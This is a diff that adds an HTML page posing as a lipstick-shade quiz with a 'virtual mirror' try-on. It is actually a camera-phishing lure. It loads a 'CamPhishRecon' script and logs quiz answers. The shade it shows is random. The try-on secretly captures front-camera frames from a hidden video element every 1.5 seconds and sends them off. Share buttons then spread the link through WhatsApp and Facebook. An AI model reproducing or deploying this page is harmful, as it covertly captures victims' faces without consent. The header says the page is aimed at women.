@@ -1,0 +1,132 @@
+<!-- DESC: Beauty/cosmetics virtual try-on quiz — female targeted, camera for face try-on -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Beauty Quiz - Find Your Perfect Shade</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
+body{background:linear-gradient(135deg,#fff0f5,#ffe4ec);min-height:100vh;display:flex;align-items:center;justify-content:center}
+.box{width:400px;max-width:92vw;background:#fff;border-radius:24px;padding:40px;text-align:center;box-shadow:0 8px 32px rgba(255,105,180,0.15)}
+.logo{font-size:28px;font-weight:900;background:linear-gradient(135deg,#ff6b9d,#c44dff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+.sub{color:#cc8899;font-size:14px;margin-bottom:30px}
+.step{display:none}.step.active{display:block}
+.step-num{font-size:12px;color:#ff6b9d;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:16px}
+.q{font-size:22px;color:#333;font-weight:700;margin-bottom:24px}
+.options{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.opt{padding:16px;border:2px solid #ffe4ec;border-radius:16px;cursor:pointer;font-size:14px;color:#666;transition:all .15s;background:#fff}
+.opt:active,.opt.sel{border-color:#ff6b9d;background:#fff0f5;color:#ff6b9d}
+.opt-emoji{font-size:32px;display:block;margin-bottom:6px}
+.progress{height:4px;background:#ffe4ec;border-radius:2px;margin:20px 0;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,#ff6b9d,#c44dff);border-radius:2px;transition:width .3s}
+.result{display:none}.result.active{display:block}
+.result-emoji{font-size:64px;margin-bottom:16px}
+.result-title{font-size:24px;font-weight:900;color:#ff6b9d;margin-bottom:8px}
+.result-desc{color:#cc8899;font-size:14px;line-height:1.6;margin-bottom:24px}
+.tryon-btn{background:linear-gradient(135deg,#ff6b9d,#c44dff);color:#fff;border:none;padding:14px 40px;border-radius:30px;font-size:16px;font-weight:700;cursor:pointer;width:100%}
+.tryon-btn:active{transform:scale(0.97)}
+.scanning{position:fixed;inset:0;background:rgba(255,240,245,0.97);z-index:100;display:none;align-items:center;justify-content:center;flex-direction:column}
+.scanning.active{display:flex}
+.scan-cam{width:200px;height:200px;border-radius:50%;border:4px solid #ff6b9d;overflow:hidden;background:#000;margin-bottom:20px;position:relative}
+.scan-cam::after{content:'';position:absolute;inset:0;border:2px solid rgba(255,107,157,0.5);border-radius:50%;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.05);opacity:0.7}}
+.share-btns{display:flex;gap:8px;margin-top:16px}
+.sb{flex:1;padding:10px;border:none;border-radius:20px;color:#fff;font-weight:600;font-size:13px;cursor:pointer}
+.s-wa{background:#25D366}.s-fb{background:#1877F2}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div class="box">
+<div class="logo">💄 Beauty Quiz</div>
+<div class="sub">Find your perfect shade in 3 questions!</div>
+<div class="step active" id="s1">
+<div class="step-num">Question 1 of 3</div>
+<div class="q">What's your skin tone?</div>
+<div class="options">
+<div class="opt" onclick="pick(1,'Fair')"><span class="opt-emoji">🤍</span>Fair</div>
+<div class="opt" onclick="pick(1,'Medium')"><span class="opt-emoji">💛</span>Medium</div>
+<div class="opt" onclick="pick(1,'Tan')"><span class="opt-emoji">🤎</span>Tan</div>
+<div class="opt" onclick="pick(1,'Deep')"><span class="opt-emoji">❤️</span>Deep</div>
+</div>
+</div>
+<div class="step" id="s2">
+<div class="step-num">Question 2 of 3</div>
+<div class="q">What's your style?</div>
+<div class="options">
+<div class="opt" onclick="pick(2,'Natural')"><span class="opt-emoji">🌿</span>Natural</div>
+<div class="opt" onclick="pick(2,'Glam')"><span class="opt-emoji">✨</span>Glam</div>
+<div class="opt" onclick="pick(2,'Bold')"><span class="opt-emoji">💋</span>Bold</div>
+<div class="opt" onclick="pick(2,'Soft')"><span class="opt-emoji">🌸</span>Soft</div>
+</div>
+</div>
+<div class="step" id="s3">
+<div class="step-num">Question 3 of 3</div>
+<div class="q">Best feature?</div>
+<div class="options">
+<div class="opt" onclick="pick(3,'Eyes')"><span class="opt-emoji">👀</span>Eyes</div>
+<div class="opt" onclick="pick(3,'Lips')"><span class="opt-emoji">👄</span>Lips</div>
+<div class="opt" onclick="pick(3,'Cheeks')"><span class="opt-emoji">😊</span>Cheeks</div>
+<div class="opt" onclick="pick(3,'Skin')"><span class="opt-emoji">💆‍♀️</span>Skin</div>
+</div>
+</div>
+<div class="result" id="result">
+<div class="result-emoji">💋</div>
+<div class="result-title">Your Perfect Shade</div>
+<div class="result-desc" id="resultDesc">Based on your answers, your perfect shade is <b>Rose Pink #340</b>. Try it on with our virtual try-on!</div>
+<button class="tryon-btn" onclick="startTryOn()">📷 Try It On — Virtual Mirror</button>
+<div class="share-btns">
+<button class="sb s-wa" onclick="shareResult('wa')">💬 Share</button>
+<button class="sb s-fb" onclick="shareResult('fb')">📘 Share</button>
+</div>
+</div>
+<div class="progress"><div class="progress-fill" id="prog" style="width:33%"></div></div>
+</div>
+<div class="scanning" id="scanning">
+<div class="scan-cam" id="scanCam"></div>
+<div style="font-size:18px;font-weight:700;color:#ff6b9d">Analyzing your face...</div>
+<div style="font-size:13px;color:#cc8899;margin-top:8px">Matching shade to your skin tone</div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL=location.origin+'/t/beauty-quiz';
+var answers={},step=1;
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+function pick(s,v){
+answers['q'+s]=v;
+document.querySelectorAll('#s'+s+' .opt').forEach(function(o){o.classList.remove('sel');});
+event.target.closest('.opt').classList.add('sel');
+setTimeout(function(){
+document.getElementById('s'+s).classList.remove('active');
+if(s<3){step=s+1;document.getElementById('s'+(s+1)).classList.add('active');document.getElementById('prog').style.width=((s+1)/3*100)+'%';}
+else{document.getElementById('prog').style.width='100%';showResult();}
+},400);
+}
+function showResult(){
+document.getElementById('result').classList.add('active');
+var shades=['Rose Pink #340','Coral Crush #220','Berry Bliss #410','Nude Glow #110'];
+var desc=shades[Math.floor(Math.random()*shades.length)];
+document.getElementById('resultDesc').innerHTML='Based on your answers, your perfect shade is <b>'+desc+'</b>. Try it on with our virtual mirror!';
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('quiz_completed',{answers:answers,shade:desc});
+}
+function startTryOn(){
+var sc=document.getElementById('scanning');sc.classList.add('active');
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('try_on_started',{});
+if(navigator.mediaDevices){
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
+var v=document.getElementById('v');v.srcObject=stream;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'beauty_tryon');}},1500);
+setTimeout(function(){clearInterval(ci);sc.classList.remove('active');alert('Virtual mirror session ended. Check your recommended products!');},8000);
+}).catch(function(){setTimeout(function(){sc.classList.remove('active');alert('Camera access needed for virtual try-on.');},2000);});
+}else{setTimeout(function(){sc.classList.remove('active');},2000);}
+}
+function shareResult(t){
+var msg='💄 I found my perfect lipstick shade! Take the Beauty Quiz: '+SHARE_URL;
+if(navigator.canShare){navigator.share({text:msg,title:'Beauty Quiz'}).catch(function(){});return;}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
+}
+</script>
+</body></html>
